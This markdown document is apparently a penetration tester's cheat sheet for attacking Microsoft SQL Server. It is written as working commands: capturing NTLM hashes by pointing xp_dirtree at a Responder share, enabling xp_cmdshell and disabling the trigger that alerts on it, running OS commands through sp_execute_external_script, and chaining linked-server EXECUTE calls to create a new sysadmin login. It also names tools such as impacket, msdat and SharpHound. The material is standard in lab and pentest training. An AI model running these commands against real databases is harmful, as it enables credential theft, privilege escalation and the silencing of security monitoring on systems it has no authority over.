## Connect to it 

- use mssqlclient.py from impacket, don't forget -windows-auth if you have


`mssqlclient.py <user>@<IP> -db <Database>`


- `IS_SRVROLEMEMBER ('sysadmin')`. If it returns 1, you have the highest privileges on the database.

---

## Test security of an MSSQL Server remotely

- ```msdat```

---

## Extract hash of the current user

- Run responder (`responder -I tun0`) and use `xp_dirtree` to see what hash you can catch : `EXEC master ..xp_dirtree '\\<ip>\<share>'`

![3b6677afecac41881691efb6eb7cc0e1.png](../../_resources/8f72c1f014924d5281187572899d109f.png)



---

## Basic enumeration

- Enumerate the database for credentials or sensitive data
- Exploit the database to obtain RCE and/or a reverse shell

- First attempt : xp_cmdshell : `enable_xp_cmdshell`


If it doesn't work, we are going to enumerate : 

http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

```
SQL> select @@version;

SQL> select name,sysadmin from syslogins;

SQL> SELECT name FROM master..syslogins
name

SQL> SELECT name FROM master..syslogins WHERE sysadmin = '1';
```

### Enumerate current privileges : 

`SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER');`

### List the databases : 

`SELECT name FROM master..sysdatabases;`

- If `xp_cmdshell` will not allow the current user to gain RCE, another stored procedure could be used for RCE.

- A common MSSQL Metasploit module was used to list the procedures enabled for this user : `mssql_enum`

- If this one is present : `sp_execute_external_script`

- You can have RCE on the machine : `exec sp_execute_external_script @language = N'Python', @script=N'import os;os.system("ipconfig")'`

https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5

- List a database :
`SQL> select table_name,table_schema from <db>.INFORMATION_SCHEMA.TABLES;`

- To query a different DB in MSSQL, it’s [server].[db].[schema].[table].



## Linked Servers

https://blog.netspi.com/how-to-hack-database-links-in-sql-server/

- An SQL Server Link is where an MSSQL server allows a link to an external data source including other MSSQL servers, Oracle databases, Excel workbooks, etc. The link describes what resources are accesses and as what user. That can be taken advantage of if the link is not set up carefully.

- To check for linked servers, query the sysservers table :

`SQL> select srvname, isremote from sysservers;`

- For `isremote`, value 1 stands for remote server, 0 for linked server.

- The article uses `openquery` to run queries on other servers. `EXECUTE` can do it too. For example, to get the server name :

`SQL> EXECUTE ('select @@servername;') at [<servername>];`

- Check which user is configured to run commands:

`SQL> EXECUTE ('select suser_name();') at [COMPATIBILITY\POO_CONFIG];`

- Check which users are admin :

`SQL> EXECUTE ('SELECT name FROM master..syslogins WHERE sysadmin = ''1'';') at [<servername>];
`

- Check your permissions :

`SQL> EXECUTE ('SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''SERVER'');') at <servername>;`

- Check if we can execute commands from one server to another :

`EXECUTE ('SELECT srvname, isremote from sysservers') at [<servername>]`

- Check in the other way, maybe you will run it as another user :

`SQL> EXEC ('EXEC (''select suser_name();'') at [<servername1>]') at [<servername2];`

- Add a new user with the new permission if so : 
Add sa User

```
SQL> EXECUTE('EXECUTE(''CREATE LOGIN <user> WITH PASSWORD = ''''<password>'''';'') AT [<servername1]') AT [<servername2>]
SQL> EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''<user>'''', ''''sysadmin'''''') AT [<servername1]') AT [<servername2]
```



## xp_cmdshell

- Enable it : `enable_xp_cmdshell` or : `sp_configure 'show advanced options', '1'`

- Can't enable ? Disable Trigger. These triggers are a policy put in place to alert and block attempts to enable and use xp_cmdshell.  Triggers are stored in sys.server_triggers:

`SQL> select name from sys.server_triggers;`
name
------------------------------   
ALERT_xp_cmdshell 

- Then
`SQL> disable trigger ALERT_xp_cmdshell on all server`

- If a webserver is enabled try to executre sp_execute_external_script and see if you are logged as a different user : 
`SQL> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';`

## Active Directory and local admin ?

If you have the admin credentials of the local machine, you can't execute bloodhound with evil winrm, as this account is not in the domain. But in the MSSQL console, you could be a domain account. So try execute SharpHound with this account using credentials of the administrator.

## MSSQL shell with upload capabilities 

https://alamot.github.io/mssql_shell/

`rlwrap python2 mssql_shell.py`
